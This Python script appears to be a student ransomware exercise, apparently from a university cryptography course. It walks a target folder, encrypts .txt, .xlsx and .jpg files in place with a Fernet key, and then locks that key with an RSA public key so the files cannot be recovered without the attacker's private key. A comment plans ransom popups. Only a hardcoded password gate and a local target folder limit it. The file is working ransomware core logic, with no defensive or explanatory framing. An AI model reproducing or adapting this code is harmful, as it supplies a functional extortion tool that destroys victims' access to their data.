import os
import string
import rsa
from cryptography.fernet import Fernet
# Safeguard password


def safeguard():
    psw = input("Contraseña: ")
    if psw != 'cripto':
        quit()


# File extensions to encrypt
def extensions(ext):
    return set(ext)


def find_files(files_location, encrypted_ext):
    file_paths = []
    for root, dirs, files in os.walk(files_location):
        for file in files:
            #file_path, file_extension = os.path.splitext(root + '\\' + file)
            file_path, file_extension = os.path.splitext(root + '/' + file)
            if file_extension in encrypted_ext:
                # file_paths.append(root + '\\' + file)
                file_paths.append(root + '/' + file)
    return file_paths


def load_key():
    with open('keys/pubkey.pem', 'rb') as f:
        pubKey = rsa.PublicKey.load_pkcs1(f.read())

    return pubKey


def generate_file_key():
    key = Fernet.generate_key()
    with open('./llave.key', 'wb') as f:
        f.write(key)
    return key


def encrypt_files(paths, key):
    for file_path in paths:
        with open(file_path, 'rb') as f:
            data = f.read()
            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)
            with open(file_path, 'wb') as f:
                f.write(encrypted)


def encrypt_key(pubKey):
    with open('./keys/pubKey.pem', mode='rb') as pk_file:
        f = open("./llave.key", 'rb')
        fernet_key = f.read()
        f.close()

        encrypted_fernet_key = rsa.encrypt(fernet_key, pubKey)

        f = open("./llave.key", 'wb')
        f.write(bytearray(encrypted_fernet_key))
        f.close()


def main():
    safeguard()
    encrypted_ext = extensions(('.txt', '.xlsx', '.jpg'))
    files_location = 'C:\\Users\\Pedro\\Documents\\FIUBA\\Cripto\\Atacar'
    files_location = './Atacar'
    paths = find_files(files_location, encrypted_ext)
    file_key = generate_file_key()
    encrypt_files(paths, file_key)
    rsa_key = load_key()
    encrypt_key(rsa_key)
    # TODO: popups notificando rescate te kbio


if __name__ == "__main__":
    main()
